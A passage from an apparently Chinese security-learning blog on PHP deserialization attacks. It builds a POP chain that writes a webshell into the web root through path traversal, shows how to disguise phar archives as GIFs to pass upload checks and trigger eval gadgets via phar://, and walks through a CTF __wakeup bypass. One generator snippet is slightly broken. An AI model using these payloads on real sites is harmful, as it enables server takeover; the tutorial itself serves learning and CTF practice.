};</code></pre><p>代码这么长啊，放心，通常都会有很多用不到的类，而且一步步的回溯都不困难。</p>
<p>首先我们先找到能利用的危险函数</p>
<ul>
<li>LogWriter_File类中的file_put_contents函数，可以用来写木马。</li>
<li>OutputFilter类中，由于preg_replace函数pattern可控，如果在php版本不高于5.5的情况下可以执行命令。</li>
</ul>
<p>好，这里我就只分析file_put_contents函数写木马的POP链怎么构造。</p>
<p>​    找到了危险函数就要找可以利用的魔法方法啦，每一个类的魔法方法都一个个的跟踪的话我感觉比较麻烦，我比较喜欢通过危险函数一步步的追溯到可以利用的魔法方法。</p>
<p>​    首先，file_put_contents函数是在LogWriter_File类的WriteLog方法中的，搜索在Logger类的log方法中执行了WriteLog方法，搜索发现在Song类的log函数执行了Logger类的log方法。最后，在Lyrics类的__destruct魔法方法中执行了Song类的log函数。</p>
<p>​    理清楚了这个链条，那么我们下一步就是构造反序列化数据并想办法把我们要写的木马内容和地址放在里面，而这个链条的所有类我们只需要考虑相关的类方法，在链条中不存在类方法可以直接注释掉。值得注意的是，这意味着下面的好几个类没有用了。</p>
<p>​    先把用不到的类和部分类没有用到的方法(没有用到的方法是不用分析的，包括没用的属性)。并且，要知道这些类的__construct()方法仅仅作用在于帮我们构造，如果它们里面存在限制的话我们完全可以删掉。</p>
<p>​    就比如Song类，其实我们只用到了log函数，再加上__construct方法帮我们构造，其他的函数大可删掉。log()函数用到了<code>$name</code>和<code>$group</code>属性，再加上构造POP链的<code>$logger</code>，剩下<code>$url</code>参数完全可以删掉。精简如下：</p>
<pre><code>class OutputFilter {
  protected $matchPattern;
  protected $replacement;
  function __construct($pattern, $repl) {
    $this-&gt;matchPattern = $pattern;
    $this-&gt;replacement = $repl;
  }
  function filter($data) {
    return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);
  }
};

class LogFileFormat {
  protected $filters;
  protected $endl;
  function __construct($filters, $endl) {
    $this-&gt;filters = $filters;
    $this-&gt;endl = $endl;
  }

  function format($txt) {
    foreach ($this-&gt;filters as $filter) {
      $txt = $filter-&gt;filter($txt);
    }
    $txt = str_replace(&#39;\n&#39;, $this-&gt;endl, $txt);
    return $txt;
  }
};

class LogWriter_File {
  protected $filename;
  protected $format;
  function __construct($filename, $format) {
    $this-&gt;format = $format;
    $this-&gt;filename = $filename;
  }
  function writeLog($txt) {
    $txt = $this-&gt;format-&gt;format($txt);
    //TODO: Modify the address here, and delete this TODO.
    file_put_contents(&quot;/var/log/&quot; . $this-&gt;filename, $txt, FILE_APPEND);
  }
};

class Logger {
  protected $logwriter;
  function __construct($writer) {
    $this-&gt;logwriter = $writer;
  }
  function log($txt) {
    $this-&gt;logwriter-&gt;writeLog($txt);
  }
};

class Song {
  protected $logger; 
  protected $name;
  protected $group;
  function __construct($name, $group, $logger) {
    $this-&gt;name = $name;
    $this-&gt;group = $group;
    $this-&gt;logger = $logger;
  }
  function log() {
    $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\n&quot;);
  }
}

class Lyrics {
  protected $lyrics;
  protected $song;
  function __construct($lyrics, $song) {
    $this-&gt;song = $song;
    $this-&gt;lyrics = $lyrics;
  }
  function __toString() {
    return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\n&quot;;
  }
  function __destruct() {
    $this-&gt;song-&gt;log();
  }
};</code></pre><p>​    到了最后的构造时间，从危险函数开始构造。</p>
<p>​        首先，file_put_contents函数是在LogWriter_File类的WriteLog方法中的，LogWriter_File类的第一个参数是写入文件的文件名，第二个是LogFileFormat类实例(可以看到，第二个参数返回的是被过滤的写入文件的内容)。LogFileFormat类第一个参数是OutputFilter类实例，第二个是替换’\n’的字符。OutputFilter类第一个参数是pattern，第二个是替换对象，为了不过滤OutputFilter两个参数设置一样的。</p>
<pre><code>$outputfilter = new OutputFilter(&quot;&quot;, &quot;&quot;);
$logfileformat = new LogFileFormat($outputfilter, &quot;\n&quot;);
$log_write_file = new LogWriter_File(&#39;../../../../var/www/html/webshell.php&#39;, $logfileformat);</code></pre><p>​    以上再顺便把shell地址改到web目录。</p>
<p>​    接下来是Logger类用到了LogWriter_File类，只有一个参数正好是LogWrite_Fiel类。</p>
<pre><code>$logger = new Logger($log_write_file);</code></pre><p>接下来是Song类调用了Logger的log方法，参数便为WriteLog的参数，即为写入文件的内容。最后套如$Lyrics类中。</p>
<pre><code>$song = new Song(&#39;JrXnm&#39;,&#39;&lt;?php phpinfo() ?&gt; &#39;, $logger);
$lyrics = new Lyrics(&#39;JrXnm&#39;,$song);</code></pre><p>最后整体的payload为：</p>
<pre><code>&lt;?php

class OutputFilter {
  protected $matchPattern;
  protected $replacement;
  function __construct($pattern, $repl) {
    $this-&gt;matchPattern = $pattern;
    $this-&gt;replacement = $repl;
  }
  function filter($data) {
    return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);
  }
};

class LogFileFormat {
  protected $filters;
  protected $endl;
  function __construct($filters, $endl) {
    $this-&gt;filters = $filters;
    $this-&gt;endl = $endl;
  }

  function format($txt) {
    foreach ($this-&gt;filters as $filter) {
      $txt = $filter-&gt;filter($txt);
    }
    $txt = str_replace(&#39;\n&#39;, $this-&gt;endl, $txt);
    return $txt;
  }
};

class LogWriter_File {
  protected $filename;
  protected $format;
  function __construct($filename, $format) {
    $this-&gt;format = $format;
    $this-&gt;filename = $filename;
  }
  function writeLog($txt) {
    $txt = $this-&gt;format-&gt;format($txt);
    //TODO: Modify the address here, and delete this TODO.
    file_put_contents(&quot;/var/log/&quot; . $this-&gt;filename, $txt, FILE_APPEND);
  }
};

class Logger {
  protected $logwriter;
  function __construct($writer) {
    $this-&gt;logwriter = $writer;
  }
  function log($txt) {
    $this-&gt;logwriter-&gt;writeLog($txt);
  }
};

class Song {
  protected $logger; 
  protected $name;
  protected $group;
  function __construct($name, $group, $logger) {
    $this-&gt;name = $name;
    $this-&gt;group = $group;
    $this-&gt;logger = $logger;
  }
  function log() {
    $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\n&quot;);
  }
}

class Lyrics {
  protected $lyrics;
  protected $song;
  function __construct($lyrics, $song) {
    $this-&gt;song = $song;
    $this-&gt;lyrics = $lyrics;
  }
  function __toString() {
    return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\n&quot;;
  }
  function __destruct() {
    $this-&gt;song-&gt;log();
  }
};
$outputfilter = new OutputFilter(&quot;&quot;, &quot;&quot;);
$logfileformat = new LogFileFormat($outputfilter, &quot;\n&quot;);
$log_write_file = new LogWriter_File(&#39;../../../../var/www/html/webshell.php&#39;, $logfileformat);

$logger = new Logger($log_write_file);

$song = new Song(&#39;JrXnm&#39;,&#39;&lt;?php phpinfo() ?&gt; &#39;, $logger);
$lyrics = new Lyrics(&#39;JrXnm&#39;,$song);

echo urlencode(serialize($lyrics));</code></pre><p>构造pop链的文章还可以参考：</p>
<p><a href="https://www.anquanke.com/post/id/170681#h2-0" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链(一)</a></p>
<p><a href="https://www.anquanke.com/post/id/170714" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链（二）</a></p>
<p><a href="https://www.freebuf.com/column/205855.html" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链（三）</a></p>
<h4 id="反序列化配合phar-协议"><a href="#反序列化配合phar-协议" class="headerlink" title="反序列化配合phar://协议"></a>反序列化配合phar://协议</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入unserialize()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的Black Hat上，安全研究员Sam Thomas分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code>利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。<br><strong>该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</strong></p>
<h5 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h5><h6 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h6><p>可以理解为一个标志，格式为<code>xxx，前面内容不限，但必须以__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<h6 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a manifest describing the contents</h6><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。<br><img src="https://upload-images.jianshu.io/upload_images/9113969-d8f57b88969d1d6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h6 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h6><p>被压缩文件的内容。</p>
<h6 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a signature for verifying Phar integrity (phar file format only)</h6><p>签名，放在文件末尾，格式如下：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-5769eb3536407bd1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h5 id="Demo测试"><a href="#Demo测试" class="headerlink" title="Demo测试"></a>Demo测试</h5><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。<br>注意：要将php.ini中的<code>phar.readonly</code>选项设置为Off，否则无法生成phar文件。</p>
<p>phar_gen.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>
    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>
    <span class="token comment" spellcheck="true">//签名自动计算</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>可以明显的看到meta-data是以序列化的形式存储的：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-f256545accf32fdc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-901f0c120d3edee8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>通过一个小demo证明一下<br>phar_test1.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'Destruct called'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$filename</span> <span class="token operator">=</span> 'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//phar.phar/test.txt';</span>
    <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter">?></span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-d5ec1857efa0ed58.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>其他函数当然也是可行的,当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。</p>
<h5 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h5><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub，增加gif文件头</span>
    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>
    <span class="token comment" spellcheck="true">//签名自动计算</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-c872ef40ddff63ff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>将后缀改为gif进行测试</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'Destruct called'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$filename</span> <span class="token operator">=</span> 'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//phar.gif/test.txt';</span>
    <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter">?></span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-7a55385aec21b74f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>采用这种方法可以绕过很大一部分上传检测。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>phar文件要能够上传到服务器端。</li>
<li>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数要有可用的魔术方法作为”跳板”。</li>
<li>文件操作函数的参数可控，且<code>: / phar</code>等特殊字符没有被过滤。</li>
</ul>
<h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>upload_file.php后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span> <span class="token string">'gif'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"Upload: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Type: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Temp file: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload_file/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">" already exists. "</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
      <span class="token punctuation">{</span>
      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token string">"upload_file/"</span> <span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">echo</span> <span class="token string">"Stored in: "</span> <span class="token punctuation">.</span> <span class="token string">"upload_file/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token keyword">else</span>
  <span class="token punctuation">{</span>
  <span class="token keyword">echo</span> <span class="token string">"Invalid file,you can only upload gif"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span></code></pre>
<p>upload_file.html</p>
<pre class=" language-markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://localhost/upload_file.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>
<p>file_un.php存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string">'echo "ok";'</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><strong>根据file_un.php写一个生成phar的php文件，在文件头加上GIF89a绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar://执行代码</strong><br>构造eval.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$object</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>访问eval.php生成phar.phar，将后缀改为gif。<br><img src="https://upload-images.jianshu.io/upload_images/9113969-76b33b8e7dc5c1a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>然后上传到目录下与<code>file_un.php</code>同目录，利用<code>file_un.php</code>中的危险函数getshell<br>payload:<code>file_un.php?filename=phar://phar.gif/test</code><br><img src="https://upload-images.jianshu.io/upload_images/9113969-dd5905733c0bf54d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h4 id="靶场相关题目"><a href="#靶场相关题目" class="headerlink" title="靶场相关题目"></a>靶场相关题目</h4><h5 id="攻防世界（unserialize3"><a href="#攻防世界（unserialize3" class="headerlink" title="攻防世界（unserialize3)"></a>攻防世界（unserialize3)</h5><p>题目来源:攻防世界 web进阶区</p>
<img src="QQ截图20200114184702.png"  />

<p>代码审计可知我们需要绕过__wakeup()函数。</p>
<p> 我们首先根据题目源码构造序列化代码。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200114190910.png" alt=""></p>
<p>这里利用到了一个 __wakeup()函数的漏洞（CVE-2016-7124）。</p>
<p><strong>一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，可以用来绕过；</strong></p>
<p>得到的序列化字符串为：O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
<p>括号前的数字即为属性值,所以将其修改后传入url中即可获得flag。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200114191751.png" alt=""></p>
